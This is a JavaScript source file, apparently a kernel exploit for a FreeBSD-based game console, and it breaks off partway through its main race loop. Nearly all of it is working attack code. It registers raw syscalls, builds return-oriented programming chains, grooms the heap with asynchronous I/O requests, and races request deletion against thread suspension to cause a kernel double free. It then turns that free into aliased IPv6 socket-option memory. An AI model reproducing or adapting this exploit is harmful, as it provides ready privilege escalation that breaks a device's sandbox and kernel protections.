if (!String.prototype.padStart) {
    String.prototype.padStart = function padStart(targetLength, padString) {
        targetLength = targetLength >> 0; // truncate if number or convert non-number to 0
        padString = String(typeof padString !== 'undefined' ? padString : ' ');
        if (this.length > targetLength) {
            return String(this);
        } else {
            targetLength = targetLength - this.length;
            if (targetLength > padString.length) {
                padString += padString.repeat(targetLength / padString.length); // append to original to ensure we are longer than needed
            }
            return padString.slice(0, targetLength) + String(this);
        }
    };
}

FW_VERSION = "";

PAGE_SIZE = 0x4000;
PHYS_PAGE_SIZE = 0x1000;

LIBKERNEL_HANDLE = 0x2001;

MAIN_CORE = 4;
MAIN_RTPRIO = 0x100;
NUM_WORKERS = 2;
NUM_GROOMS = 0x200;
NUM_HANDLES = 0x100;
NUM_SDS = 64;
NUM_SDS_ALT = 48;
NUM_RACES = 100;
NUM_ALIAS = 100;
LEAK_LEN = 16;
NUM_LEAKS = 16;
NUM_CLOBBERS = 8;
MAX_AIO_IDS = 0x80;

AIO_CMD_READ = 1;
AIO_CMD_FLAG_MULTI = 0x1000;
AIO_CMD_MULTI_READ = 0x1001;
AIO_CMD_WRITE = 2;
AIO_STATE_COMPLETE = 3;
AIO_STATE_ABORTED = 4;

SCE_KERNEL_ERROR_ESRCH = 0x80020003;

RTP_LOOKUP = new BigInt(0);
RTP_SET = new BigInt(1);
PRI_REALTIME = new BigInt(2);

block_fd = 0xffffffff;
unblock_fd = 0xffffffff;
block_id = 0xffffffff;
groom_ids = null;
sds = null;
sds_alt = null;
prev_core = -1;
prev_rtprio = 0;
ready_signal = 0;
deletion_signal = 0;
pipe_buf = 0;

saved_fpu_ctrl = 0;
saved_mxcsr = 0;

function write8 (addr, val) {
    mem.view(addr).setUint8(0, val&0xFF, true)
}

function write16 (addr, val) {
    mem.view(addr).setUint16(0, val&0xFFFF, true)
}

function write32 (addr, val) {
    mem.view(addr).setUint32(0, val&0xFFFFFFFF, true)
}

function write64 (addr, val) {
    mem.view(addr).setBigInt(0, new BigInt(val), true)
}

function read8 (addr) {
    return mem.view(addr).getUint8(0, true)
}

function read16 (addr) {
    return mem.view(addr).getUint16(0, true)
}

function read32 (addr) {
    return mem.view(addr).getUint32(0, true)
}

function read64 (addr) {
    return mem.view(addr).getBigInt(0, true)
}

function malloc(size) {
    return mem.malloc(size)
}

function hex(val) {
    if (val instanceof BigInt)
        return val.toString();
    return '0x' + val.toString(16).padStart(2, '0');
}

function send_notification(msg) {
    utils.notify(msg);
}

// Socket constants - only define if not already in scope
// (inject.js defines some of these as const in the eval scope)
if (typeof AF_UNIX === 'undefined') AF_UNIX = 1;
if (typeof AF_INET === 'undefined') AF_INET = 2;
if (typeof AF_INET6 === 'undefined') AF_INET6 = 28;

if (typeof SOCK_STREAM === 'undefined') SOCK_STREAM = 1;
if (typeof SOCK_DGRAM === 'undefined') SOCK_DGRAM = 2;

if (typeof IPPROTO_TCP === 'undefined') IPPROTO_TCP = 6;
if (typeof IPPROTO_UDP === 'undefined') IPPROTO_UDP = 17;
if (typeof IPPROTO_IPV6 === 'undefined') IPPROTO_IPV6 = 41;

if (typeof SOL_SOCKET === 'undefined') SOL_SOCKET = 0xFFFF;
if (typeof SO_REUSEADDR === 'undefined') SO_REUSEADDR = 4;
if (typeof SO_LINGER === 'undefined') SO_LINGER = 0x80;

// IPv6 socket options
if (typeof IPV6_PKTINFO === 'undefined') IPV6_PKTINFO = 46;
if (typeof IPV6_NEXTHOP === 'undefined') IPV6_NEXTHOP = 48;
if (typeof IPV6_RTHDR === 'undefined') IPV6_RTHDR = 51;
if (typeof IPV6_TCLASS === 'undefined') IPV6_TCLASS = 61;
if (typeof IPV6_2292PKTOPTIONS === 'undefined') IPV6_2292PKTOPTIONS = 25;

// TCP socket options
if (typeof TCP_INFO === 'undefined') TCP_INFO = 32;
if (typeof TCPS_ESTABLISHED === 'undefined') TCPS_ESTABLISHED = 4;
if (typeof size_tcp_info === 'undefined') size_tcp_info = 0xec;  /* struct tcp_info */

// Create shorthand references
var unlink        = fn.register(0xA, 'unlink', 'bigint');
var pipe          = fn.register(42, 'pipe', 'bigint');
var getpid        = fn.register(20, 'getpid', 'bigint');
var getuid        = fn.register(0x18, 'getuid', 'bigint');
var kill          = fn.register(37, 'kill', 'bigint');
var connect       = fn.register(98, 'connect', 'bigint');
var munmap        = fn.register(0x49, 'munmap', 'bigint');
var mprotect      = fn.register(0x4A, 'mprotect', 'bigint');
var getsockopt    = fn.register(0x76, 'getsockopt', 'bigint');
var socketpair    = fn.register(0x87, 'socketpair', 'bigint');
var sysctl        = fn.register(0x0ca, 'sysctl', 'bigint');
var nanosleep     = fn.register(0xF0, 'nanosleep', 'bigint');
var sched_yield   = fn.register(0x14B, 'sched_yield', 'bigint');
var thr_exit      = fn.register(0x1AF, 'thr_exit', 'bigint');
var thr_self      = fn.register(0x1B0, 'thr_self', 'bigint');
var thr_new       = fn.register(0x1C7, 'thr_new', 'bigint');
var rtprio_thread = fn.register(0x1D2, 'rtprio_thread', 'bigint');
var mmap               = fn.register(477, 'mmap', 'bigint');
var cpuset_getaffinity = fn.register(0x1E7, 'cpuset_getaffinity', 'bigint');
var cpuset_setaffinity = fn.register(0x1E8, 'cpuset_setaffinity', 'bigint');
var jitshm_create = fn.register(0x215, 'jitshm_create', 'bigint');
var jitshm_alias  = fn.register(0x216, 'jitshm_alias', 'bigint');

var evf_create    = fn.register(0x21A, 'evf_create', 'bigint');
var evf_devare    = fn.register(0x21B, 'evf_devare', 'bigint');
var evf_set       = fn.register(0x220, 'evf_set', 'bigint');
var evf_clear     = fn.register(0x221, 'evf_clear', 'bigint');
var evf_delete    = fn.register(0x21b, 'evf_delete', 'bigint');

var is_in_sandbox = fn.register(0x249, 'is_in_sandbox', 'bigint');
var dlsym         = fn.register(0x24F, 'dlsym', 'bigint');
var thr_suspend_ucontext = fn.register(0x278, 'thr_suspend_ucontext', 'bigint');
var thr_resume_ucontext  = fn.register(0x279, 'thr_resume_ucontext', 'bigint');

var aio_multi_delete     = fn.register(0x296, 'aio_multi_delete', 'bigint');
var aio_multi_wait       = fn.register(0x297, 'aio_multi_wait', 'bigint');
var aio_multi_poll       = fn.register(0x298, 'aio_multi_poll', 'bigint');
var aio_multi_cancel     = fn.register(0x29A, 'aio_multi_cancel', 'bigint');
var aio_submit_cmd       = fn.register(0x29D, 'aio_submit_cmd', 'bigint');

var kexec                = fn.register(0x295, 'kexec', 'bigint');
var socket               = fn.register(0x61, 'socket', 'bigint');
var setsockopt           = fn.register(0x69, 'setsockopt', 'bigint');
var bind                 = fn.register(0x68, 'bind', 'bigint');
var read                 = fn.register(0x3, 'read', 'bigint');
var write                = fn.register(0x4, 'write', 'bigint');
var open                 = fn.register(0x5, 'open', 'bigint');
var close                = fn.register(0x6, 'close', 'bigint');
var accept               = fn.register(0x1e, 'accept', 'bigint');
var listen               = fn.register(0x6a, 'listen', 'bigint');
var getsockname          = fn.register(0x20, 'getsockname', 'bigint');

var setjmp = fn.register(libc_addr.add(0x6CA00), 'setjmp', 'bigint');
var setjmp_addr = libc_addr.add(0x6CA00);
var longjmp = fn.register(libc_addr.add(0x6CA50), 'longjmp', 'bigint');
var longjmp_addr = libc_addr.add(0x6CA50);

// Extract syscall wrapper addresses for ROP chains from syscalls.map
var read_wrapper                 = syscalls.map.get(0x03)
var write_wrapper                = syscalls.map.get(0x04)
var sched_yield_wrapper          = syscalls.map.get(0x14b)
var thr_suspend_ucontext_wrapper = syscalls.map.get(0x278)
var cpuset_setaffinity_wrapper   = syscalls.map.get(0x1e8)
var rtprio_thread_wrapper        = syscalls.map.get(0x1D2)
var aio_multi_delete_wrapper     = syscalls.map.get(0x296)
var thr_exit_wrapper             = syscalls.map.get(0x1af)

var BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF);

function sysctlbyname(name, oldp, oldp_len, newp, newp_len) {
    const translate_name_mib = malloc(0x8);
    const buf_size = 0x70;
    const mib = malloc(buf_size);
    const size = malloc(0x8);
    
    write64(translate_name_mib, new BigInt(0x3, 0x0));
    write64(size, buf_size);
    
    const name_addr = utils.cstr(name);
    const name_len = new BigInt(name.length);
   
    if (sysctl(translate_name_mib, 2, mib, size, name_addr, name_len) === new BigInt(0xffffffff, 0xffffffff)) {
        log("failed to translate sysctl name to mib (" + name + ")");
    }
    
    if (sysctl(mib, 2, oldp, oldp_len, newp, newp_len) === new BigInt(0xffffffff, 0xffffffff)) {
        return false;
    }
    
    return true;
}

function get_fwversion() {
    const buf = malloc(0x8);
    const size = malloc(0x8);
    write64(size, 0x8);
    if (sysctlbyname("kern.sdk_version", buf, size, 0, 0)) {
        const byte1 = Number(read8(buf.add(2)));  // Minor version (first byte)
        const byte2 = Number(read8(buf.add(3)));  // Major version (second byte)
        
        const version = byte2.toString(16).padStart(2, '0') + '.' + byte1.toString(16).padStart(2, '0');
        return version;
    }
    
    return null;
}

function init_threading() {
    const jmpbuf = malloc(0x60);
    setjmp(jmpbuf);
    saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
    saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
}   

function pin_to_core(core) {
    const mask = malloc(0x10);
    write32(mask, 1 << core);
    cpuset_setaffinity(3, 1, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0x10, mask);
}

function get_core_index(mask_addr) {
    var num = Number(read32(mask_addr));
    var position = 0;
    while (num > 0) {
        num = num >>> 1;
        position++;
    }
    return position - 1;
}

function get_current_core() {
    const mask = malloc(0x10);
    cpuset_getaffinity(3, 1, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0x10, mask);
    return get_core_index(mask);
}

function set_rtprio(prio) {
    const rtprio = malloc(0x4);
    write16(rtprio, PRI_REALTIME);
    write16(rtprio.add(2), prio);
    rtprio_thread(RTP_SET, 0, rtprio);
}

function get_rtprio() {
    const rtprio = malloc(0x4);
    write16(rtprio, PRI_REALTIME);
    write16(rtprio.add(2), 0);
    rtprio_thread(RTP_LOOKUP, 0, rtprio);
    return Number(read16(rtprio.add(2)));
}

function aio_submit_cmd_fun(cmd, reqs, num_reqs, priority, ids) {
    const result = aio_submit_cmd(cmd, reqs, num_reqs, priority, ids);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("aio_submit_cmd error: " + hex(result));
    }
    return result;
}

function aio_multi_cancel_fun(ids, num_ids, states) {
    log("Enter aio_multi_cancel_fun with " + hex(ids) + " " + hex(num_ids) + " " + hex(states) );
    const result = aio_multi_cancel(ids, num_ids, states);
    log("aio_multi_cancel_fun result " + hex(result) );
    if (result.eq(BigInt_Error)) {
        throw new Error("aio_multi_cancel error: " + hex(result));
    }
    return result;
}

function aio_multi_poll_fun(ids, num_ids, states) {
    const result = aio_multi_poll(ids, num_ids, states);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("aio_multi_poll error: " + hex(result));
    }
    return result;
}

function aio_multi_wait_fun(ids, num_ids, states, mode, timeout) {
    const result = aio_multi_wait(ids, num_ids, states, mode, timeout);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("aio_multi_wait error: " + hex(result));
    }
    return result;
}

function aio_multi_delete_fun(ids, num_ids, states) {
    const result = aio_multi_delete(ids, num_ids, states);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("aio_multi_delete error: " + hex(result));
    }
    return result;
}

function make_reqs1(num_reqs) {
    const reqs = malloc(0x28 * num_reqs);
    for (var i = 0; i < num_reqs; i++) {
        write32(reqs.add(i * 0x28 + 0x20), 0xFFFFFFFF);
    }
    return reqs;
}

function spray_aio(loops, reqs, num_reqs, ids, multi, cmd) {
    loops = loops || 1;
    cmd = cmd || AIO_CMD_READ;
    if (multi === undefined) multi = true;

    const step = 4 * (multi ? num_reqs : 1);
    const final_cmd = cmd | (multi ? AIO_CMD_FLAG_MULTI : 0);

    for (var i = 0; i < loops; i++) {
        aio_submit_cmd_fun(final_cmd, reqs, num_reqs, 3, ids + (i * step));
    }
}

function cancel_aios(ids, num_ids) {
    const len = MAX_AIO_IDS;
    const rem = num_ids % len;
    const num_batches = Math.floor((num_ids - rem) / len);

    const errors = malloc(4 * len);

    for (var i = 0; i < num_batches; i++) {
        aio_multi_cancel_fun(ids + (i * 4 * len), len, errors);
    }

    if (rem > 0) {
        aio_multi_cancel_fun(ids + (num_batches * 4 * len), rem, errors);
    }
}

function free_aios(ids, num_ids, do_cancel) {
    if (do_cancel === undefined) do_cancel = true;

    const len = MAX_AIO_IDS;
    const rem = num_ids % len;
    const num_batches = Math.floor((num_ids - rem) / len);

    const errors = malloc(4 * len);

    for (var i = 0; i < num_batches; i++) {
        const addr = ids + i * 4 * len;
        if (do_cancel) {
            aio_multi_cancel_fun(addr, len, errors);
        }
        aio_multi_poll_fun(addr, len, errors);
        aio_multi_delete_fun(addr, len, errors);
    }

    if (rem > 0) {
        const addr = ids + (num_batches * 4 * len);
        if (do_cancel) {
            aio_multi_cancel_fun(addr, rem, errors);
        }
        aio_multi_poll_fun(addr, rem, errors);
        aio_multi_delete_fun(addr, rem, errors);
    }
}

function free_aios2(ids, num_ids) {
    free_aios(ids, num_ids, false);
}

function aton(ip_str) {
    const parts = ip_str.split('.').map(Number);
    return (parts[3] << 24) | (parts[2] << 16) | (parts[1] << 8) | parts[0];
}

function new_tcp_socket() {
    const sd = socket(AF_INET, SOCK_STREAM, 0);
    if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("new_tcp_socket error: " + hex(sd));
    }
    return sd
}

function new_socket() {
    const sd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("new_socket error: " + hex(sd));
    }
    return sd
}

function create_pipe() {
    const fildes = malloc(0x10);

    log("      create_pipe: calling pipe syscall...");

    // Use the standard syscall() function from inject.js
    const result = pipe(fildes);

    log("      create_pipe: pipe returned " + hex(result));

    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("pipe syscall failed");
    }

    const read_fd  = new BigInt(read32(fildes));         // easier to have BigInt for upcoming usage
    const write_fd = new BigInt(read32(fildes.add(4))); // easier to have BigInt for upcoming usage
    log("      create_pipe: read_fd=" + hex(read_fd) + " write_fd=" + hex(write_fd));
    return [read_fd, write_fd];
}

function spawn_thread(rop_race1_array) {
    const rop_race1_addr = malloc(0x400); // ROP Stack plus extra size
    log("This is rop_race1_array.length " + rop_race1_array.length);
    // Fill ROP Stack
    for(var i=0 ; i < rop_race1_array.length ; i++) {
        write64(rop_race1_addr.add(i*8), new BigInt(rop_race1_array[i]));
        //log("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
    }

    const jmpbuf = malloc(0x60);

    // FreeBSD amd64 jmp_buf layout:
    // 0x00: RIP, 0x08: RBX, 0x10: RSP, 0x18: RBP, 0x20-0x38: R12-R15, 0x40: FPU, 0x44: MXCSR
    write64(jmpbuf.add(0x00), gadgets.RET);         // RIP - ret gadget
    write64(jmpbuf.add(0x10), rop_race1_addr);      // RSP - pivot to ROP chain
    write32(jmpbuf.add(0x40), new BigInt(saved_fpu_ctrl)); // FPU control
    write32(jmpbuf.add(0x44), new BigInt(saved_mxcsr));    // MXCSR

    const stack_size = new BigInt(0x400);
    const tls_size = new BigInt(0x40);

    const thr_new_args  = malloc(0x80);
    const tid_addr      = malloc(0x8);
    const cpid          = malloc(0x8);
    const stack         = malloc(Number(stack_size));
    const tls           = malloc(Number(tls_size));

    write64(thr_new_args.add(0x00), longjmp_addr);       // start_func = longjmp
    write64(thr_new_args.add(0x08), jmpbuf);             // arg = jmpbuf
    write64(thr_new_args.add(0x10), stack);              // stack_base
    write64(thr_new_args.add(0x18), stack_size);         // stack_size
    write64(thr_new_args.add(0x20), tls);                // tls_base
    write64(thr_new_args.add(0x28), tls_size);           // tls_size
    write64(thr_new_args.add(0x30), tid_addr);           // child_tid (output)
    write64(thr_new_args.add(0x38), cpid);               // parent_tid (output)

    const result = thr_new(thr_new_args, new BigInt(0x68));
    if (!result.eq(BigInt.Zero)) {
        throw new Error("thr_new failed: " + hex(result));
    }

    return read64(tid_addr);
}

function nanosleep_fun(nsec) {
    const timespec = malloc(0x10);
    write64(timespec, Math.floor(nsec / 1e9));    // tv_sec
    write64(timespec.add(8), nsec % 1e9);         // tv_nsec
    nanosleep(timespec);
}

function wait_for(addr, threshold) {
    while (!read64(addr).eq(new BigInt(threshold))) {
        nanosleep_fun(1);
    }
}

function call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid) {

    var insts = [];

    // write(pipe_write_fd, pipe_buf, 1) - using per-syscall gadget
    insts.push(gadgets.POP_RDI_RET);
    insts.push(pipe_write_fd);
    insts.push(gadgets.POP_RSI_RET);
    insts.push(pipe_buf);
    insts.push(gadgets.POP_RDX_RET);
    insts.push(new BigInt(1));
    insts.push(write_wrapper);

    // sched_yield() - using per-syscall gadget
    insts.push(sched_yield_wrapper);

    // thr_suspend_ucontext(thr_tid) - using per-syscall gadget
    insts.push(gadgets.POP_RDI_RET); // pop rdi ; ret
    insts.push(thr_tid);
    insts.push(thr_suspend_ucontext_wrapper);

    // return value in rax is stored by rop.store()

    var store_size = 0x10; // 2 slots 1 for RBP and another for last syscall ret value
    var store_addr = mem.malloc(store_size);

    rop.store(insts, store_addr, 1);

    rop.execute(insts, store_addr, store_size);

    return read64(store_addr.add(8)); // return value for 2nd slot
}

function race_one(req_addr, tcp_sd, sds) {
    try {
        //log("this is ready_signal and deletion_signal " + hex(ready_signal) + " " + hex(deletion_signal));
        write64(ready_signal, 0);
        write64(deletion_signal, 0);

        const sce_errs = malloc(0x100);  // 8 bytes for errs + scratch for TCP_INFO
        write32(sce_errs,        0xFFFFFFFF);  // -1
        write32(sce_errs.add(4), 0xFFFFFFFF);  // -1
        //log("race_one before pipe");
        var pipe_fds = create_pipe();
        const pipe_read_fd = pipe_fds[0];
        const pipe_write_fd = pipe_fds[1];
        //const [pipe_read_fd, pipe_write_fd] = create_pipe();
        //log("race_one after pipe");

        var rop_race1 = [];

        rop_race1.push(new BigInt(0)); // first element overwritten by longjmp, skip it
        
        const cpu_mask = malloc(0x10);
        write16(cpu_mask, 1 << MAIN_CORE);

        // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
        rop_race1.push(gadgets.POP_RDI_RET);
        rop_race1.push(new BigInt(3));                        // CPU_LEVEL_WHICH
        rop_race1.push(gadgets.POP_RSI_RET);
        rop_race1.push(new BigInt(1));                        // CPU_WHICH_TID
        rop_race1.push(gadgets.POP_RDX_RET);
        rop_race1.push(new BigInt(0xFFFFFFFF, 0xFFFFFFFF));   // id = -1 (current thread)
        rop_race1.push(gadgets.POP_RCX_RET);
        rop_race1.push(new BigInt(0x10));                     // setsize
        rop_race1.push(gadgets.POP_R8_RET);
        rop_race1.push(cpu_mask);
        rop_race1.push(cpuset_setaffinity_wrapper);

        const rtprio_buf = malloc(4);
        write16(rtprio_buf, PRI_REALTIME);
        write16(rtprio_buf.add(2), MAIN_RTPRIO);

        // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
        rop_race1.push(gadgets.POP_RDI_RET);
        rop_race1.push(new BigInt(1));         // RTP_SET
        rop_race1.push(gadgets.POP_RSI_RET); 
        rop_race1.push(new BigInt(0));         // lwpid = 0 (current thread)
        rop_race1.push(gadgets.POP_RDX_RET);
        rop_race1.push(rtprio_buf);
        rop_race1.push(rtprio_thread_wrapper);

        // Signal ready - write 1 to ready_signal
        rop_race1.push(gadgets.POP_RDI_RET);
        rop_race1.push(ready_signal);
        rop_race1.push(gadgets.POP_RAX_RET);
        rop_race1.push(new BigInt(1));
        rop_race1.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

        // Read from pipe (blocks here) - read(pipe_read_fd, pipe_buf, 1)
        rop_race1.push(gadgets.POP_RDI_RET);
        rop_race1.push(pipe_read_fd);
        rop_race1.push(gadgets.POP_RSI_RET);
        rop_race1.push(pipe_buf);
        rop_race1.push(gadgets.POP_RDX_RET);
        rop_race1.push(new BigInt(1));
        rop_race1.push(read_wrapper);

        // aio multi delete - aio_multi_delete(req_addr, 1, sce_errs + 4)
        rop_race1.push(gadgets.POP_RDI_RET);
        rop_race1.push(req_addr);
        rop_race1.push(gadgets.POP_RSI_RET);
        rop_race1.push(new BigInt(1));
        rop_race1.push(gadgets.POP_RDX_RET);
        rop_race1.push(sce_errs.add(4));
        rop_race1.push(aio_multi_delete_wrapper);

        // Signal deletion - write 1 to deletion_signal
        rop_race1.push(gadgets.POP_RDI_RET); // pop rdi ; ret
        rop_race1.push(deletion_signal);
        rop_race1.push(gadgets.POP_RAX_RET);
        rop_race1.push(new BigInt(1));
        rop_race1.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

        // Thread exit - thr_exit(0)
        rop_race1.push(gadgets.POP_RDI_RET);
        rop_race1.push(new BigInt(0));
        rop_race1.push(thr_exit_wrapper);

        //log("race_one before spawnt_thread");
        const thr_tid = spawn_thread(rop_race1);
        //log("race_one after spawnt_thread");
        
        // Wait for thread to signal ready
        wait_for(ready_signal, 1);
        //log("race_one after wait_for");

        const suspend_res = call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid);
        log("Suspend result: " + hex(suspend_res));
        //log("race_one after call_suspend_chain");

        const scratch = sce_errs.add(8);  // Use offset for scratch space
        aio_multi_poll_fun(req_addr, 1, scratch);
        const poll_res = read32(scratch);
        log("poll_res after suspend: " + hex(poll_res));
        //log("race_one after aio_multi_poll_fun");

        get_sockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, scratch, size_tcp_info);
        const tcp_state = read8(scratch);
        log("tcp_state: " + hex(tcp_state));

        var won_race = false;

        if (poll_res !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
            aio_multi_delete_fun(req_addr, 1, sce_errs);
            won_race = true;
            log("Race won!");
        }else {
            log("Race not won (poll_res=" + hex(poll_res) + " tcp_state=" + hex(tcp_state) + ")");
        }

        const resume_result = thr_resume_ucontext(thr_tid);
        log("Resume " + hex(thr_tid) + ": " + resume_result);
        //log("race_one after thr_resume_ucontext");
        nanosleep_fun(5);

        if (won_race) {
            const err_main_thr = read32(sce_errs);
            const err_worker_thr = read32(sce_errs.add(4));
            log("sce_errs: main=" + hex(err_main_thr) + " worker=" + hex(err_worker_thr));

            if (err_main_thr === err_worker_thr && err_main_thr === 0) {
                log("Double-free successful, making aliased rthdrs...");
                const sd_pair = make_aliased_rthdrs(sds);

                if (sd_pair !== null) {
                    close(pipe_read_fd);
                    close(pipe_write_fd);
                    return sd_pair;
                } else {
                    log("Failed to make aliased rthdrs");
                }
            } else {
                log("sce_errs mismatch - race failed");
            }
        }

        close(pipe_read_fd);
        close(pipe_write_fd);

        return null;

    } catch (e) {
        log("  race_one error: " + e.message);
        return null;
    }
}

function build_rthdr(buf, size) {
    const len = ((Number(size) >> 3) - 1) & ~1;
    const actual_size = (len + 1) << 3;
        write8(buf, 0);
        write8(buf.add(1), len);
        write8(buf.add(2), 0);
        write8(buf.add(3), len >> 1);
    return actual_size;
}

function set_sockopt(sd, level, optname, optval, optlen) {
    const result = setsockopt(sd, level, optname, optval, optlen);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("set_sockopt error: " + hex(result));
    }
    return result;
}

function get_sockopt(sd, level, optname, optval, optlen) {
    const len_ptr = malloc(4);
    write32(len_ptr, optlen);
    const result = getsockopt(sd, level, optname, optval, len_ptr);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("get_sockopt error: " + hex(result));
    }
    return read32(len_ptr);
}

function set_rthdr(sd, buf, len) {
    return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function get_rthdr(sd, buf, max_len) {
    return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
}

function free_rthdrs(sds) {
    for (var i = 0; i < sds.length; i++) {
        if (!sds[i].eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
        }
    }
}

function make_aliased_rthdrs(sds) {
    const marker_offset = 4;
    const size = 0x80;
    const buf = malloc(size);
    const rsize = build_rthdr(buf, size);

    for (var loop = 1; loop <= NUM_ALIAS; loop++) {
        for (var i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
            const sd = Number(sds[i-1]);
            if (!sds[i-1].eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) { // sds[i-1] !== 0xffffffffffffffffn
                write32(buf.add(marker_offset), i);
                set_rthdr(sd, buf, rsize);
            }
        }

        for (var i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
            const sd = Number(sds[i-1]);
            if (!sds[i-1].eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) { // sds[i-1] !== 0xffffffffffffffffn
                get_rthdr(sd, buf, size);
                const marker = Number(read32(buf.add(marker_offset)));

                if (marker !== i && marker > 0 && marker <= NUM_SDS) {
                    const aliased_idx = marker - 1;
                    const aliased_sd = Number(sds[aliased_idx]);
                    if (aliased_idx >= 0 && aliased_idx < sds.length && !sds[aliased_idx].eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) { // sds[aliased_idx] !== 0xffffffffffffffffn
                        log("  Aliased pktopts found");
                        const sd_pair = [sd, aliased_sd];
                        const max_idx = Math.max(i-1, aliased_idx);
                        const min_idx = Math.min(i-1, aliased_idx);
                        sds.splice(max_idx, 1);
                        sds.splice(min_idx, 1);
                        free_rthdrs(sds);
                        sds.push(new_socket());
                        sds.push(new_socket());
                        return sd_pair;
                    }
                }
            }
        }
    }
    return null;
}

function setup() {
    try {

        init_threading();

        ready_signal = malloc(8);
        deletion_signal = malloc(8);
        pipe_buf = malloc(8);

        write64(ready_signal, 0);
        write64(deletion_signal, 0);

        prev_core = get_current_core();
        prev_rtprio = get_rtprio();

        pin_to_core(MAIN_CORE);
        set_rtprio(MAIN_RTPRIO);
        log("  Previous core " + prev_core + " Pinned to core " + MAIN_CORE);

        const sockpair = malloc(8);
        ret = socketpair(AF_UNIX, SOCK_STREAM, 0, sockpair);
        if (!ret.eq(BigInt.Zero)) {
            return false;
        }

        block_fd = read32(sockpair);
        unblock_fd = read32(sockpair.add(4));

        const block_reqs = malloc(0x28 * NUM_WORKERS);
        for (var i = 0; i < NUM_WORKERS; i++) {
            const offset = i * 0x28;
            write32(block_reqs.add(offset).add(0x08), 1);
            write32(block_reqs.add(offset).add(0x20), block_fd);
        }

        const block_id_buf = malloc(4);
        ret = aio_submit_cmd_fun(AIO_CMD_READ, block_reqs, NUM_WORKERS, 3, block_id_buf);
        if (!ret.eq(BigInt.Zero)) {
            return false;
        }

        block_id = read32(block_id_buf);
        log("  AIO workers ready");

        const num_reqs = 3;
        const groom_reqs = make_reqs1(num_reqs);
        const groom_ids_addr = malloc(4 * NUM_GROOMS);

        spray_aio(NUM_GROOMS, groom_reqs, num_reqs, groom_ids_addr, false);
        cancel_aios(groom_ids_addr, NUM_GROOMS);

        groom_ids = [];
        for (var i = 0; i < NUM_GROOMS; i++) {
            groom_ids.push(Number(read32(groom_ids_addr.add(i * 4))));
        }

        sds = [];
        for (var i = 0; i < NUM_SDS; i++) {
            const sd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
            if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
                throw new Error("socket alloc failed at sds[" + i + "] - reboot system");
            }
            sds.push(sd);
        }

        sds_alt = [];
        for (var i = 0; i < NUM_SDS_ALT; i++) {
            const sd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
            if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
                throw new Error("socket alloc failed at sds_alt[" + i + "] - reboot system");
            }
            sds_alt.push(sd);
        }
        log("  Sockets allocated (" + NUM_SDS + " + " + NUM_SDS_ALT + ")");

        return true;

    } catch (e) {
        log("  Setup failed: " + e.message);
        return false;
    }
}

function double_free_reqs2() {
    try {
        const server_addr = malloc(16);
        write8(server_addr.add(1), AF_INET);
        write16(server_addr.add(2), 0);
        write32(server_addr.add(4), aton("127.0.0.1"));

        const sd_listen = new_tcp_socket();

        const enable = malloc(4);
        write32(enable, 1);
        set_sockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4);

        ret = bind(sd_listen, server_addr, 16);

        if (!ret.eq(BigInt.Zero)) {
            log("bind failed");
            close(sd_listen);
            return null;
        }

        const addr_len = malloc(4);
        write32(addr_len, 16);
        ret = getsockname(sd_listen, server_addr, addr_len)
        if (!ret.eq(BigInt.Zero)) {
            log("getsockname failed");
            close(sd_listen);
            return null;
        }
        log("Bound to port: " + Number(read16(server_addr.add(2))));

        ret = listen(sd_listen, 1)
        if (!ret.eq(BigInt.Zero)) {
            log("listen failed");
            close(sd_listen);
            return null;
        }
        
        const num_reqs  = 3;
        const which_req = num_reqs - 1;
        const reqs      = make_reqs1(num_reqs);
        const aio_ids   = malloc(4 * num_reqs);
        const req_addr  = aio_ids.add(which_req * 4);
        const errors    = malloc(4 * num_reqs);
        const cmd       = AIO_CMD_MULTI_READ;

        for (var attempt = 1; attempt <= NUM_RACES; attempt++) {
            //log("Race attempt " + attempt + "/" + NUM_RACES);

            const sd_client = new_tcp_socket();

            ret = connect(sd_client, server_addr, 16);
            if (!ret.eq(BigInt.Zero)) {
                close(sd_client);
                continue;
            }

